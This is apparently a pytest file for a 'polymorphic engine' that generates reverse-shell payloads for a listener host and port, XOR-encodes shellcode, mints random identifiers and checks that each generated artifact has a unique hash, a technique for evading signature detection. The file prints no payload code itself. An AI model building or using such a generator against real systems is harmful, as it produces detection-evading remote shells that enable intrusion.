"""
Unit tests for modules/polymorphic_engine.py
"""

import os
import sys
import shutil
import tempfile

sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

import pytest

# Do NOT import from `cryptography` here.  The system cffi backend may be
# broken (pyo3 PanicException), which cannot be caught reliably and would
# crash the test collector.  The polymorphic engine already falls back to
# pure-Python RC4 when the cryptography library is missing/broken, so all
# engine tests below work without it.

from modules.polymorphic_engine import (
    NameMint,
    PolymorphicEngine,
    PolymorphicShellcodeEncoder,
    _xor,
)


# ─────────────────────────────────────────────────────────────────────────────
#  Helpers
# ─────────────────────────────────────────────────────────────────────────────

def _make_engine(tmp_dir: str) -> PolymorphicEngine:
    """Return a PolymorphicEngine that writes into a temp directory."""
    return PolymorphicEngine(out_dir=os.path.join(str(tmp_dir), 'poly'))


# ─────────────────────────────────────────────────────────────────────────────
#  run_full_generation — uniqueness invariant
# ─────────────────────────────────────────────────────────────────────────────

class TestFullGeneration:

    @pytest.mark.xfail(reason='AES-CTR requires functioning cryptography cffi backend')
    def test_all_artifacts_unique(self, tmp_path):
        """
        Run run_full_generation twice with *different* engines.
        The sha256 sets from both runs must not overlap (every artifact is unique).
        """
        e1 = _make_engine(str(tmp_path / 'run1'))
        out1 = e1.run_full_generation(lhost='192.168.1.1', lport=4444)
        hashes1 = {a['sha256'] for a in out1['artifacts']}

        e2 = _make_engine(str(tmp_path / 'run2'))
        out2 = e2.run_full_generation(lhost='192.168.1.1', lport=4444)
        hashes2 = {a['sha256'] for a in out2['artifacts']}

        assert len(hashes1) == len(out1['artifacts']), \
            'Duplicate artifact detected within run 1'
        assert len(hashes2) == len(out2['artifacts']), \
            'Duplicate artifact detected within run 2'

        overlap = hashes1 & hashes2
        assert not overlap, \
            f'Hash collision across two runs: {len(overlap)} duplicates'


# ─────────────────────────────────────────────────────────────────────────────
#  Reverse shell — bash syntax check
# ─────────────────────────────────────────────────────────────────────────────

class TestReverseShellBash:

    def test_reverse_shell_bash_runs_syntax_check(self, tmp_path):
        """
        The generated bash payload must pass `bash -n` (syntax check).
        Skip if bash is not installed.
        """
        if shutil.which('bash') is None:
            pytest.skip('bash not available on this host')

        import subprocess
        e = _make_engine(str(tmp_path))
        art = e.revsh.bash('10.10.10.10', 9001)

        script = tmp_path / 'shell.sh'
        script.write_text(art.code)
        result = subprocess.run(['bash', '-n', str(script)],
                                capture_output=True, text=True)
        assert result.returncode == 0, (
            f'bash -n failed:\n{result.stderr}\nPayload:\n{art.code}')


# ─────────────────────────────────────────────────────────────────────────────
#  Shellcode encoder — XOR round-trip
# ─────────────────────────────────────────────────────────────────────────────

class TestShellcodeXOR:

    def test_shellcode_xor_round_trip(self):
        """XOR-encode then XOR-decode with the same key must yield original."""
        shellcode = b'\x90' * 32 + b'\xcc'   # NOP sled + INT3
        key = b'\xde\xad\xbe\xef'

        encoded = _xor(shellcode, key)
        decoded = _xor(encoded, key)

        assert decoded == shellcode, \
            'XOR round-trip did not reproduce the original shellcode'

    def test_shellcode_xor_differs_from_original(self):
        """XOR-encoded shellcode must differ from plaintext (sanity check)."""
        shellcode = b'\x41' * 16   # 'A' * 16
        key = b'\xff'              # XOR with 0xFF flips all bits
        encoded = _xor(shellcode, key)
        assert encoded != shellcode

    def test_encoder_encode_decode_via_pkg(self):
        """
        Use PolymorphicShellcodeEncoder.encode() with scheme='xor' and
        manually XOR-decode with the recovered key — original must match.
        """
        enc = PolymorphicShellcodeEncoder()
        shellcode = bytes(range(32))
        pkg = enc.encode(shellcode, scheme='xor')

        key = pkg['params']['key']
        recovered = _xor(pkg['encoded'], key)
        assert recovered == shellcode


# ─────────────────────────────────────────────────────────────────────────────
#  NameMint — collision-free identifier generation
# ─────────────────────────────────────────────────────────────────────────────

class TestNameMint:

    def test_name_mint_no_collisions(self):
        """Mint 500 identifiers — all must be unique."""
        mint = NameMint()
        names = [mint.mint() for _ in range(500)]
        assert len(names) == len(set(names)), \
            'NameMint produced duplicate identifiers'

    def test_name_mint_class_kind(self):
        """kind='class' names start with an uppercase letter."""
        mint = NameMint()
        name = mint.mint(kind='class')
        assert name[0].isupper(), f'Class name does not start with uppercase: {name}'

    def test_name_mint_fn_kind(self):
        """kind='fn' names contain a recognised prefix."""
        mint = NameMint()
        name = mint.mint(kind='fn')
        assert any(name.startswith(p) for p in ('fn_', 'do_', 'run_', 'op_', 'call_')), \
            f'Function name has unexpected prefix: {name}'

    def test_name_mint_uniqueness_across_kinds(self):
        """Minting across different kinds still preserves global uniqueness."""
        mint = NameMint()
        names = (
            [mint.mint(kind='var')   for _ in range(100)]
            + [mint.mint(kind='class') for _ in range(100)]
            + [mint.mint(kind='fn')    for _ in range(100)]
        )
        assert len(names) == len(set(names))
